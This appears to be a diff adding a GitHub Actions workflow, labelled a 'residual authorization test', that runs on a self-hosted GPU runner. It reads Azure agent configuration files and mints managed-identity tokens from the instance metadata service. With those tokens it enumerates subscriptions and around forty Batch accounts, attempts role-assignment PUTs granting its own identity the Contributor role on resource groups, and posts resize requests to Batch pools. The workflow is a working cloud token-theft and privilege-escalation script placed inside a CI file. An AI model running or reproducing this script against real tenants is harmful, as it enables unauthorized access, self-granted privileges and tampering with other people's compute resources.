@@ -1,0 +1,117 @@
+name: azresid
+on:
+  workflow_dispatch:
+jobs:
+  azresid:
+    runs-on: [self-hosted, gpu]
+    timeout-minutes: 40
+    steps:
+      - name: residual-authz-test
+        run: |
+          set +e
+          SUB=21bcfd92-9348-4285-a51e-815d6e56bddf
+          IMDS="http://169.254.169.254/metadata"
+          ACCTS='[["ulbatcheastus", "eastus"], ["ulbatcheastus2", "eastus2"], ["ulbatchwestus", "westus"], ["ulbatchnorthcentralus", "northcentralus"], ["ulbatchbrazilsouth", "brazilsouth"], ["ulbatchnortheurope", "northeurope"], ["ulbatchcentralus", "centralus"], ["ulbatcheastasia", "eastasia"], ["ulbatchjapaneast", "japaneast"], ["ulbaustraliase", "australiasoutheast"], ["ulbatchjapanwest", "japanwest"], ["ulbatchkoreacentral", "koreacentral"], ["ulbatchsoutheastasia", "southeastasia"], ["ulbatchsouthcentralus", "southcentralus"], ["ulbatchaustraliaeast", "australiaeast"], ["ulbatchsouthindia", "southindia"], ["ulbatchcentralindia", "centralindia"], ["ulbatchcanadacentral", "canadacentral"], ["ulbatchuksouth", "uksouth"], ["ulbatchwestcentralus", "westcentralus"], ["ulbatchwestus2", "westus2"], ["ulbatchfrancecentral", "francecentral"], ["ulbatchsouthafricanorth", "southafricanorth"], ["ulbatchuaenorth", "uaenorth"], ["ulbatchaustraliacentral", "australiacentral"], ["ulbgermanywestcentra", "germanywestcentral"], ["ulbatchswitzerlandnorth", "switzerlandnorth"], ["ulbatchnorwayeast", "norwayeast"], ["ulbatchwestus3", "westus3"], ["ulbatchswedencentral", "swedencentral"], ["ulbatchqatarcentral", "qatarcentral"], ["ulbatchpolandcentral", "polandcentral"], ["ulbatchitalynorth", "italynorth"], ["ulbatchisraelcentral", "israelcentral"], ["ulbatchspaincentral", "spaincentral"], ["ulbatchmexicocentral", "mexicocentral"], ["ulbatchtaiwannorth", "taiwannorth"], ["ulbatchnewzealandnorth", "newzealandnorth"], ["ulbatchindonesiacentral", "indonesiacentral"], ["ulbatchchilecentral", "chilecentral"], ["ulbatchmalaysiawest", "malaysiawest"]]'
+          echo "=== [HOST] ==="
+          hostname; id; hostname -I; nproc
+          nvidia-smi -L 2>&1 | head -12
+          echo "=== [WAAGENT] ==="
+          ls -la /var/lib/waagent/ 2>&1 | head -20
+          for f in /var/lib/waagent/ManagedIdentity-Settings /var/lib/waagent/HostingEnvironmentConfig /etc/waagent.conf; do
+            if [ -f "$f" ]; then echo "--- $f"; sed -n '1,40p' "$f"; fi
+          done
+          echo "=== [ENVTOK] ==="
+          env | grep -iE 'IDENTITY_ENDPOINT|IDENTITY_HEADER|MSI_|AZURE_' | sed 's/=.*/=<set>/' || true
+          ls -la /root/.azure 2>&1 | head -10
+          echo "=== [IMDS INSTANCE] ==="
+          curl -s -m 10 -H "Metadata: true" "$IMDS/instance?api-version=2021-02-01" -o /tmp/imds.json -w "instance_http=%{http_code}\n"
+          python3 - <<'PYI'
+          import json
+          try:
+              d=json.load(open('/tmp/imds.json'))['compute']
+              for k in ('name','resourceGroupName','subscriptionId','location','vmId','vmSize','offer','osType','placementGroupId'):
+                  print('imds_'+k+'='+str(d.get(k)))
+          except Exception as e:
+              print('imds_parse_err', e)
+          PYI
+          mint() {
+            label="$1"; qs="$2"
+            curl -s -m 15 -H "Metadata: true" "$IMDS/identity/oauth2/token?api-version=2018-02-01&$qs" -o /tmp/tok_$label.json -w "TOKENMINT $label http=%{http_code} bytes=%{size_download}\n"
+            python3 - "$label" <<'PYJ'
+          import json,sys,base64
+          label=sys.argv[1]; path='/tmp/tok_'+label+'.json'
+          try: d=json.load(open(path))
+          except Exception as e:
+              print('TOK '+label+' parse_err '+str(e)); sys.exit()
+          t=d.get('access_token')
+          if not t:
+              print('TOK '+label+' ERR '+json.dumps(d)[:500]); sys.exit()
+          p=t.split('.')[1]; p+='='*(-len(p)%4)
+          c=json.loads(base64.urlsafe_b64decode(p))
+          print('TOK '+label+' oid='+str(c.get('oid'))+' appid='+str(c.get('appid'))+' idtyp='+str(c.get('idtyp'))+' aud='+str(c.get('aud'))+' exp='+str(c.get('exp'))+' mirid='+str(c.get('xms_mirid'))+' upn='+str(c.get('upn')))
+          open('/tmp/tok_'+label+'.txt','w').write(t)
+          PYJ
+          }
+          mint sys_arm   "resource=https%3A%2F%2Fmanagement.azure.com%2F"
+          mint sys_batch "resource=https%3A%2F%2Fbatch.core.windows.net%2F"
+          mint uami_arm   "resource=https%3A%2F%2Fmanagement.azure.com%2F&client_id=2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6"
+          mint uami_batch "resource=https%3A%2F%2Fbatch.core.windows.net%2F&client_id=2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6"
+          echo "=== [ARM TESTS] ==="
+          armtests() {
+            label="$1"
+            if [ ! -s /tmp/tok_$label.txt ]; then echo "ARMTEST $label SKIP no-token"; return; fi
+            t=$(cat /tmp/tok_$label.txt)
+            for path in "/subscriptions?api-version=2022-12-01" "/subscriptions/$SUB/resourcegroups/rg-i63282-brazilsouth?api-version=2021-04-01" "/subscriptions/$SUB/resourcegroups/T19I52947-ITALYNORTH?api-version=2021-04-01" "/subscriptions/$SUB/resourcegroups/RG19P-I46107-407?api-version=2021-04-01" "/subscriptions/$SUB/resourcegroups/rg-i63282-brazilsouth/providers/Microsoft.Compute/virtualMachines/i4801-rt-a100?api-version=2024-07-01" "/subscriptions/$SUB/resourcegroups/T19I52947-ITALYNORTH/providers/Microsoft.Compute/virtualMachines/t19i52947-ita-m2?api-version=2024-07-01" "/subscriptions/$SUB/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"; do
+              code=$(curl -s -m 20 -o /tmp/a.json -w "%{http_code}" -H "Authorization: Bearer $t" "https://management.azure.com$path")
+              echo "ARMGET $label $code ${path}"
+              if [ "$code" != "200" ]; then head -c 400 /tmp/a.json; echo; fi
+            done
+            oid=$(python3 -c "import json,base64;t=open('/tmp/tok_$label.txt').read().strip();p=t.split('.')[1];p+='='*(-len(p)%4);print(json.loads(base64.urlsafe_b64decode(p)).get('oid'))")
+            for rg in rg-i63282-brazilsouth T19I52947-ITALYNORTH; do
+              g=$(python3 -c "import uuid;print(uuid.uuid4())")
+              echo "ARMPUT $label $rg grant name=$g principal=$oid"
+              curl -s -m 25 -X PUT -H "Authorization: Bearer $t" -H "Content-Type: application/json" -d "{\"properties\":{\"roleDefinitionId\":\"/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635\",\"principalId\":\"$oid\",\"principalType\":\"ServicePrincipal\"}}" -o /tmp/p.json -w "ARMPUT_CODE $label $rg %{http_code}\n" "https://management.azure.com/subscriptions/$SUB/resourcegroups/$rg/providers/Microsoft.Authorization/roleAssignments/$g?api-version=2022-04-01"
+              head -c 400 /tmp/p.json; echo
+            done
+          }
+          armtests sys_arm
+          armtests uami_arm
+          echo "=== [BATCH DATA PLANE] ==="
+          batchtest() {
+            label="$1"
+            if [ ! -s /tmp/tok_$label.txt ]; then echo "BATCH $label SKIP no-token"; return; fi
+            t=$(cat /tmp/tok_$label.txt)
+            python3 -c "import json,sys; [print(a[0]+chr(9)+a[1]) for a in json.loads(sys.argv[1])]" "$ACCTS" > /tmp/accts.tsv
+            while IFS=$(printf '\t') read -r nm loc; do
+              url="https://$nm.$loc.batch.azure.com/pools?api-version=2024-07-01"
+              code=$(curl -s -m 15 -o /tmp/b.json -w "%{http_code}" -H "Authorization: Bearer $t" "$url")
+              n=$(python3 -c "import json;d=json.load(open('/tmp/b.json'));print(len(d.get('value',[])) if isinstance(d,dict) else 'x')" 2>/dev/null)
+              echo "BATCHGET $label $nm $loc http=$code pools=$n"
+              if [ "$code" = "200" ] && [ "$n" != "0" ] && [ "$n" != "x" ]; then
+                python3 -c "import json;import sys; d=json.load(open('/tmp/b.json')); nm=sys.argv[1]; [print('BATCHPOOL',nm,p['id'],p.get('state'),p.get('targetDedicatedNodes'),p.get('targetLowPriorityNodes'),p.get('currentLowPriorityNodes'),p.get('allocationState')) or open('/tmp/pool_'+nm+'.id','w').write(p['id']) for p in d.get('value',[])[:1]]" "$nm"
+                pid=$(cat /tmp/pool_$nm.id 2>/dev/null)
+                if [ -n "$pid" ]; then
+                  curl -s -m 20 -X POST -H "Authorization: Bearer $t" -H "Content-Type: application/json" -H "Content-Length: 0" -o /tmp/rz.json -w "BATCHRESIZE $label $nm pool=$pid %{http_code}\n" "https://$nm.$loc.batch.azure.com/pools/$pid/resize?api-version=2024-07-01"
+                  head -c 300 /tmp/rz.json; echo
+                fi
+              fi
+              if [ "$code" = "401" ]; then head -c 250 /tmp/b.json; echo; fi
+            done < /tmp/accts.tsv
+          }
+          batchtest uami_batch
+          batchtest sys_batch
+          batchtest uami_arm
+          echo "=== [NEGATIVE CONTROLS] ==="
+          BOGUS="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMC8iLCJpYXQiOjE3MDAwMDAwMDAsIm5iZiI6MTcwMDAwMDAwMCwiZXhwIjoxOTAwMDAwMDAwLCJvaWQiOiJiMGIwMGIwYi0wMGIwLTBiMGItMGIwYi0wYjBiMGIwYjBiMGIifQ.bogus_signature_value_not_valid"
+          for tgt in "https://management.azure.com/subscriptions?api-version=2022-12-01" "https://ulbatcheastus.eastus.batch.azure.com/pools?api-version=2024-07-01"; do
+            code=$(curl -s -m 15 -o /tmp/n.json -w "%{http_code}" -H "Authorization: Bearer $BOGUS" "$tgt")
+            echo "NEGCTL bogus-token $code $tgt"
+            head -c 200 /tmp/n.json; echo
+          done
+          if [ -s /tmp/tok_uami_batch.txt ]; then
+            t=$(cat /tmp/tok_uami_batch.txt)
+            code=$(curl -s -m 15 -o /tmp/n2.json -w "%{http_code}" -H "Authorization: Bearer $t" "https://management.azure.com/subscriptions?api-version=2022-12-01")
+            echo "NEGCTL batch-aud-token-against-arm $code"
+            head -c 300 /tmp/n2.json; echo
+          fi
+          echo "=== [DONE] ==="
